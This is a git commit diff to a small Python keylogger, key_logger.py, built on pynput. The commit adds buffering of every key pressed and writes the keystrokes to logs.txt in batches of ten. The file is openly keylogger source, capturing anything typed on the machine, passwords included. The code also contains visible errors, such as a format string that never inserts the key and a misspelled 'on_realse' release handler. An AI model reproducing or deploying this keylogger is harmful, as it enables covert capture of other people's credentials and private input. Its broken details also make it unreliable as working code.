5c12b200e7b6274c21cff5d40efb809ffc5ad29b
pafechet <pierreantoine.fechet@gmail.com>
2020-12-02 18:05:24 +0100

    save to txt file

--- key_logger.py
+++ key_logger.py
@@ -3,9 +3,29 @@ import pynput
 
 from pynput.keyboard import Key, Listener
 
+def write_file(keys):
+	with open ("logs.txt", "a") as f:
+		for key in keys:
+			k= str(key).replace("'","")
+			if (k.find("space") > 0):
+				f.write('\n')
+			elif (k.find("key") == -1):
+				f.write(k)
 
+count = 0
+keys = []
 def on_press(key):
+	global keys, count
+
 	print("[0] pressed".format(key))
+
+	keys.append(key)
+	count+=1
+
+	if (count >= 10):
+		count = 0
+		write_file(keys)
+		keys = []
 
 
 def on_realse(key):
@@ -15,9 +35,6 @@ def on_realse(key):
 
 with Listener(on_press = on_press, on_realse = on_realse) as listener:
 	listener.join()
-
-
-
 
 
 
